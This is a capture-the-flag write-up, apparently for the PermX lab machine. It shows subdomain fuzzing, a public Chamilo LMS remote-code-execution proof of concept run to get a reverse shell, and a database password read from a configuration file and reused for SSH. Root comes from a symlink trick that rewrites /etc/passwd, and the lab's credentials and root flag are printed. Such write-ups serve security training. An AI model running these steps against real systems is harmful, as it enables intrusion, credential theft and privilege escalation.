# PermX

---

<img width="831" alt="Screenshot 2024-07-27 at 2 12 17 PM" src="https://github.com/user-attachments/assets/35d02f35-492e-46e8-86f2-47ce160cfab5">

---

Nmap Scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

Port 80 

add domain permx.htb to /etc/hosts file.



<img width="1175" alt="Screenshot 2024-07-27 at 2 16 31 PM" src="https://github.com/user-attachments/assets/6157d8c0-948d-467f-bdb8-d5024513c9e4">



---

let go for subdomains

```bash
ffuf -u 'http://permx.htb/' -H "HOST: FUZZ.permx.htb" -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
```

<img width="934" alt="subdomain" src="https://github.com/user-attachments/assets/3565b336-ab33-4336-97c1-37e7b178db2c">

---

add domaind lms.permx.htb in  /etc/hosts file...

<img width="716" alt="host" src="https://github.com/user-attachments/assets/08fca79c-c50c-4476-89ed-811ea20337da">

---

<img width="722" alt="Screenshot 2024-07-27 at 1 16 20 PM" src="https://github.com/user-attachments/assets/3be3f3a3-bb8f-4d32-b578-26fe6bda52a7">

---
Webiste is using Chamilo 1

```bash
❯ curl -I http://lms.permx.htb/
HTTP/1.1 200 OK
Date: Sat, 27 Jul 2024 08:49:01 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: ch_sid=f7vmgmjnsq9qi6tof8moef3lnr; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Powered-By: Chamilo 1
Set-Cookie: GotoCourse=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; HttpOnly
Content-Type: text/html; charset=UTF-8
```

### USER SHELL

use this exploit

https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc

---

use

```bash
╰─❯ python3 main.py -u http://lms.permx.htb/ -a revshell
```


<img width="1440" alt="revshell" src="https://github.com/user-attachments/assets/8caec1b5-a67c-4aa8-ba72-26600e471b26">

---

found passwd in /var/www/chamilo/app/config/configuration.php file

<img width="981" alt="password" src="https://github.com/user-attachments/assets/4b60c807-44c5-420c-8dc7-9841cd078607">

```bash
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

<img width="982" alt="usr mtz" src="https://github.com/user-attachments/assets/30433eed-978c-4aa1-acf7-6ae7b7bb15cd">

Now use ssh to login.

user:mtz
passwd:03F6lY3uXAP2bkW8
---

<img width="1440" alt="ssh mtz" src="https://github.com/user-attachments/assets/b9a0572f-4ae8-4795-af3b-e31bbd208a3f">


### ROOT ACCESS

<img width="710" alt="sudo -l" src="https://github.com/user-attachments/assets/e0e58051-cb32-4c36-b29e-b6a226e10238">

We need to create a symbolic link then add root user hash in  /etc/passwd file.

generate password using openssl

```bash
❯ openssl passwd -1 'kant'
$1$OG3GEPM0$bDa2dBCJvJ3CyNbW/p0Yp0
```
---

edit the /etc/passwd file........

<img width="722" alt="Screenshot 2024-07-27 at 2 05 33 PM" src="https://github.com/user-attachments/assets/f319b600-aed8-4594-98c2-4d7184a70909">

---

```bash
mtz@permx:~$ nano /etc/passwd
mtz@permx:~$ ln -s /etc/passwd ./passwd
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/passwd
mtz@permx:~$ nano /etc/passwd
mtz@permx:~$ su
Password:
root@permx:/home/mtz# cd /root
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
5eef2a44005d68339e051f076be59e53
root@permx:~#
```






